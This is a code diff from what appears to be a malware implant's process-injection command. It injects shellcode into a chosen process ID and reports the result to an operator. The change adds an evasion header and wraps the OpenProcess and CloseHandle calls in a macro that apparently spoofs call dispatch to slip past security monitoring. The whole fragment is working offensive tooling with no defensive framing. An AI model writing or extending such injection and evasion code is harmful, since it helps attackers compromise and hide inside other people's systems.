@@ -10,6 +10,7 @@
 using namespace stardust;
 using namespace starburst;
 
+#include <evasion/spoof_dispatch.h>
 #include <evasion/injection_techniques.h>
 
 auto declfn starburst::cmd_shinject(
@@ -29,7 +30,7 @@ auto declfn starburst::cmd_shinject(
 
     DBG_PRINT( inst, "cmd_shinject: pid=%u sc_len=%u\n", pid, sc_len );
 
-    HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
+    HANDLE h_proc = (HANDLE)SCALL( inst, kernel32.OpenProcess, PROCESS_ALL_ACCESS, FALSE, pid );
     if ( !h_proc ) {
         char msg[80] = { 0 };
         str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
@@ -43,14 +44,14 @@ auto declfn starburst::cmd_shinject(
     HANDLE h_thread = inject_shellcode( inst, h_proc, sc_data, sc_len );
 
     if ( !h_thread ) {
-        inst.kernel32.CloseHandle( h_proc );
+        SCALL( inst, kernel32.CloseHandle, h_proc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "injection failed" ) ) );
         return;
     }
 
-    inst.kernel32.CloseHandle( h_thread );
-    inst.kernel32.CloseHandle( h_proc );
+    SCALL( inst, kernel32.CloseHandle, h_thread );
+    SCALL( inst, kernel32.CloseHandle, h_proc );
 
     char msg[80] = { 0 };
     str_copy( msg, symbol<char*>( const_cast<char*>( "injected " ) ) );
